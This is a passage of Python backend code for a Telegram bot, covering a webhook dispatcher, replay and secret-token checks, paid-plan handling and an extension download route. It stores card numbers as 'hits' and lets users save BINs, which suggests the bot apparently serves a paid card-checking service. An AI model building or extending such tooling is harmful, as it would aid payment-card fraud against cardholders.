        recovered_from_log=True,
    )
    # Atomic upsert keyed on (telegram_id, card_number, recovered_from_log=True).
    # Combined with the partial unique index this makes concurrent/edited-post
    # delivery idempotent — the second writer's $setOnInsert is a no-op and a
    # DuplicateKeyError (index race) is treated as success.
    try:
        from pymongo.errors import DuplicateKeyError
        try:
            await db.hits.update_one(
                {"telegram_id": telegram_id, "card_number": card_number, "recovered_from_log": True},
                {"$setOnInsert": hit.to_mongo()},
                upsert=True,
            )
            log.info("failsafe: recovered %s hit for user %s from admin-log post", status, telegram_id)
        except DuplicateKeyError:
            pass  # concurrent recovery already inserted it — idempotent success
    except Exception as e:
        log.warning("failsafe upsert failed: %s", e)


@router.post("/webhook")
async def telegram_webhook(request: Request):
    """Receives Telegram Bot API updates. Dispatches slash-commands.

    Configure once via:
        POST https://api.telegram.org/bot<TOKEN>/setWebhook
             ?url=https://<your-host>/api/telegram/webhook
             &secret_token=<TELEGRAM_WEBHOOK_SECRET>   ← set this env var too

    We always return {"ok": True} so Telegram doesn't retry — even if the
    command handler failed, the failure is logged and reported to the user.
    """
    # ── Webhook secret verification ────────────────────────────────────────
    # If TELEGRAM_WEBHOOK_SECRET is configured, every genuine Telegram update
    # arrives with that value in X-Telegram-Bot-Api-Secret-Token. Any POST
    # lacking or mismatching this header is a forgery — reject silently.
    _wh_secret = (getattr(settings, "TELEGRAM_WEBHOOK_SECRET", "") or "").strip()
    if _wh_secret:
        _sent = (request.headers.get("x-telegram-bot-api-secret-token") or "").strip()
        if _sent != _wh_secret:
            log.warning("webhook: rejected — bad or missing secret token")
            return {"ok": True}  # silent; don't reveal the expected value

    try:
        update = await request.json()
    except Exception as e:
        log.warning("webhook received non-json body: %s", e)
        return {"ok": True}

    # ── Replay dedup ───────────────────────────────────────────────────────
    # Telegram retries undelivered updates and a forged POST could replay an
    # old one. Atomically claim each update_id — first claimer dispatches,
    # every duplicate is silently acked.
    _update_id = update.get("update_id")
    if _update_id is not None:
        try:
            from db import get_db
            _claimed = await get_db().tg_updates.find_one_and_update(
                {"_id": int(_update_id)},
                {"$setOnInsert": {"seen_at": __import__("time").time()}},
                upsert=True,
                return_document=False,  # pymongo ReturnDocument.BEFORE
            )
            if _claimed is not None:
                return {"ok": True}  # duplicate delivery/replay — drop
        except Exception as e:
            # Never let the dedup store break command handling.
            log.warning("webhook replay-guard failed (processing anyway): %s", e)

    # ── Admin-log failsafe: ingest channel posts from the admin-log channel ──
    channel_post = update.get("channel_post") or update.get("edited_channel_post")
    if channel_post:
        # Ingestion WRITES card rows from the post body, so only trust it when the
        # webhook secret is configured (verified above). Without the secret the
        # endpoint is spoofable and a forged post could manufacture card rows.
        if not _wh_secret:
            log.warning("channel-post ingest skipped: TELEGRAM_WEBHOOK_SECRET not set (spoofable)")
            return {"ok": True}
        try:
            src_chat = (channel_post.get("chat") or {}).get("id")
            if src_chat is not None and int(src_chat) == int(settings.ADMIN_LOG_CHANNEL_ID):
                await _ingest_admin_log_post(channel_post)
        except Exception as e:
            log.warning("admin-log ingest failed: %s", e)
        return {"ok": True}

    # ── Inline-button (callback query) dispatch ──────────────────────────────
    callback = update.get("callback_query")
    if callback:
        try:
            await _handle_callback(callback)
        except Exception as e:
            log.exception("callback handling failed: %s", e)
        return {"ok": True}

    # ── Telegram Stars: pre-checkout MUST be answered within 10 seconds ──────
    pcq = update.get("pre_checkout_query")
    if pcq:
        try:
            await _handle_pre_checkout(pcq)
        except Exception as e:
            log.exception("pre-checkout handling failed: %s", e)
        return {"ok": True}

    message = update.get("message") or update.get("edited_message") or {}
    text: str = (message.get("text") or "").strip()
    chat = message.get("chat") or {}
    chat_id = chat.get("id")
    if not chat_id:
        return {"ok": True}

    # ── Telegram Stars: successful payment → automatic fulfillment ──────────
    # These messages carry no text; handle before the command dispatch.
    if message.get("successful_payment"):
        try:
            await _fulfill_stars_payment(message)
        except Exception as e:
            log.exception("stars fulfillment failed: %s", e)
        return {"ok": True}

    # Only process commands in private (DM) chats — silently ignore groups and
    # channels. Hit notifications are delivered separately by the backend to the
    # chat_id stored against each user; this gate only affects inbound commands.
    if chat.get("type") != "private":
        return {"ok": True}

    # ── Proof-of-payment photo intake ─────────────────────────────────────
    # If the user is in /paid mode and their next message contains a photo,
    # forward it to the owner. Runs BEFORE the text-command dispatch so a
    # missing caption doesn't fall through as "unknown command".
    photo = message.get("photo")
    if photo and chat_id in _PROOF_STATE:
        try:
            await _forward_proof_to_owner(
                chat_id=chat_id,
                user_message_id=message.get("message_id"),
                photo_caption=message.get("caption"),
            )
        except Exception as e:
            log.exception("proof intake failed: %s", e)
        return {"ok": True}

    if not text:
        return {"ok": True}

    # Strip the optional @BotName suffix Telegram appends inside groups.
    first_token = text.split()[0]
    command = first_token.split("@", 1)[0].lower()
    username = (message.get("from") or {}).get("username")
    from_user_id = (message.get("from") or {}).get("id")

    try:
        if command == "/start":
            await _cmd_start(chat_id, username, from_user_id)
        elif command == "/menu":
            await _cmd_menu(chat_id, username, from_user_id)
        elif command in ("/settings", "/setting"):
            await _cmd_settings(chat_id, from_user_id)
        elif command == "/help":
            await _cmd_help(chat_id)
        elif command == "/get":
            await _cmd_get(chat_id)
        elif command in ("/buy", "/premium", "/upgrade", "/plans"):
            await _cmd_buy(chat_id, username)
        elif command in ("/paid", "/proof", "/receipt"):
            await _cmd_paid(chat_id, username, from_user_id)
        elif command == "/cancel":
            await _cmd_cancel(chat_id)
        elif command in ("/sendlink", "/givelink", "/invitelink"):
            await _cmd_sendlink(chat_id, from_user_id, text.split()[1:])
        elif command in ("/status", "/stats", "/me", "/plan"):
            await _cmd_status(chat_id, from_user_id)
        elif command == "/history":
            await _cmd_history(chat_id, from_user_id)
        elif command in ("/bins", "/bin", "/mybins"):
            await _cmd_bins(chat_id, from_user_id)
        elif command in ("/savebin", "/addbin"):
            await _cmd_savebin(chat_id, from_user_id, text.split()[1:])
        # Silent no-op for anything else — the bot only claims a small command surface.
    except Exception as e:
        log.exception("bot command %s failed: %s", command, e)
        try:
            await send_message(chat_id, "⚠️ Something went wrong. Please try again.")
        except Exception:
            pass

    return {"ok": True}


@router.get("/download/extension")
async def download_extension():
    """Direct HTTPS download of the extension .zip (mirror of /get).

    Public — no auth required. Serves the latest published release, falling
    back to the legacy on-disk zip. Increments the release download counter.
    """
    from fastapi.responses import FileResponse, JSONResponse
    resolved = await _resolve_zip()
    if not resolved:
        return JSONResponse({"error": "Extension package not available"}, status_code=404)
    zip_path, release_doc = resolved
    if release_doc and release_doc.get("_id"):
        try:
            from db import get_db
            await get_db().extension_releases.update_one(
                {"_id": release_doc["_id"]},
                {"$inc": {"download_count": 1}},
            )
        except Exception:
            pass
    return FileResponse(
        str(zip_path),
        media_type="application/zip",
        filename=zip_path.name,
    )
